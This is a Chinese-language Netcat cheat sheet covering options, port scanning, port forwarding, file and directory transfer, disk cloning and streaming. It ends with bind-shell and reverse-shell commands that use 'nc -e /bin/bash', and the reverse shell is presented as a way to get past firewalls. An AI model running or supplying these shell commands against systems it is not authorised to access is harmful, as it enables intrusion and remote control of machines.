---
title: Netcat
date: 2020-11-25 18:28:43
background: bg-blue-600
tags:
  - ncat
  - nc
  - utility
  - network
  - traffic
categories:
  - Linux 命令
intro: 本速查表提供了在 Linux 和 Unix 上使用 Netcat 的各种方法。
plugins:
  - copyCode
---

## 入门 {.cols-5}

### 用法 {.col-span-2}

连接到任何位置的主机

```shell script
$ nc [选项] [主机] [端口]
```

监听传入连接

```shell script
$ nc -lp 端口 [主机] [端口]
```

### 选项示例 {.col-span-3 .row-span-2}

| 选项   | 描述                                   | 示例                                     |
| ------ | -------------------------------------- | ---------------------------------------- |
| `-h`   | nc -h                                  | 帮助                                     |
| `-z`   | nc -z 192.168.1.9 1-100                | 扫描主机或 IP 地址的端口                 |
| `-v`   | nc -zv 192.168.1.9 1-100               | 提供详细输出                             |
| `-n`   | nc -zn 192.168.1.9 1-100               | 通过禁用 DNS 解析进行快速扫描            |
| `-l`   | nc -lp 8000                            | TCP 监听模式 _(用于入站连接)_            |
| `-w`   | nc -w 180 192.168.1.9 8000             | 定义超时值                               |
| `-k`   | nc -kl 8000                            | 断开连接后继续监听                       |
| `-u`   | nc -u 192.168.1.9 8000                 | 使用 UDP 而不是 TCP                      |
| `-q`   | nc -q 1 192.168.1.9 8000               | 客户端在 EOF 后保持连接                  |
| `-4`   | nc -4 -l 8000                          | 仅 IPv4                                  |
| `-6`   | nc -6 -l 8000                          | 仅 IPv6                                  |

### 聊天客户端-服务器 {.col-span-2}

服务器 (192.168.1.9)

```shell script
$ nc -lv 8000
```

客户端

```shell script
$ nc 192.168.1.9 8000
```

## Netcat 示例

### Banner抓取

```shell script
$ nc website.com 80
GET index.html HTTP/1.1
HEAD / HTTP/1.1
```

或

```shell script
echo "" | nc -zv -wl 192.168.1.1 801-805
```

### 端口扫描

扫描 21 到 25 之间的端口

```shell script
$ nc -zvn 192.168.1.1 21-25
```

扫描端口 22、3306 和 8080

```shell script
$ nc -zvn 192.168.1.1 22 3306 8080
```

### 代理和端口转发

```shell script
$ nc -lp 8001 -c "nc 127.0.0.1 8000"
```

或

```shell script
$ nc -l 8001 | nc 127.0.0.1 8000
```

创建一个从一个本地端口到另一个本地端口的隧道

### 下载文件

服务器 (192.168.1.9)

```shell script
$ nc -lv 8000 < file.txt
```

客户端

```shell script
$ nc -nv 192.168.1.9 8000 > file.txt
```

假设您想将文件 “file.txt” 从服务器 A 传输到客户端 B。

### 上传文件

服务器 (192.168.1.9)

```shell script
$ nc -lv 8000 > file.txt
```

客户端

```shell script
$ nc 192.168.1.9 8000 < file.txt
```

假设您想将文件 “file.txt” 从客户端 B 传输到服务器 A：

### 目录传输

服务器 (192.168.1.9)

```shell script
$ tar -cvf – dir_name | nc -l 8000
```

客户端

```shell script
$ nc -n 192.168.1.9 8000 | tar -xvf -
```

假设您想通过网络将目录从 A 传输到 B。

### 加密传输 {.col-span-2}

服务器 (192.168.1.9)

```shell script
$ openssl enc -des3 -in file.txt -pass pass:password | nc -l 8000
```

客户端

```shell script
$ nc 192.168.1.9 8000 | openssl enc -des3 -d -pass pass:password -out file.txt
```

在通过网络传输数据之前对其进行加密

### 克隆

服务器 (192.168.1.9)

```shell script
$ dd if=/dev/sda | nc -l 8000
```

客户端

```shell script
$ nc -n 192.168.1.9 8000 | dd of=/dev/sda
```

克隆 Linux PC 非常简单。假设您的系统磁盘是 /dev/sda

### 视频流

服务器 (192.168.1.9)

```shell script
$ cat video.avi | nc -l 8000
```

客户端

```shell script {.wrap}
$ nc 192.168.1.9 8000 | mplayer -vo x11 -cache 3000 -
```

使用 netcat 进行视频流传输

### 远程 Shell

服务器 (192.168.1.9)

```shell script
$ nc -lv 8000 -e /bin/bash
```

客户端

```shell script
$ nc 192.168.1.9 8000
```

我们已经使用 telnet 和 ssh 实现了远程 Shell，但是如果它们没有安装并且我们没有权限安装它们，那么我们也可以使用 netcat 创建远程 Shell。

### 反向 Shell

服务器 (192.168.1.9)

```shell script
$ nc -lv 8000
```

客户端

```shell script
$ nc 192.168.1.9 8000 -v -e /bin/bash
```

反向 Shell 通常用于绕过防火墙限制，例如阻止入站连接
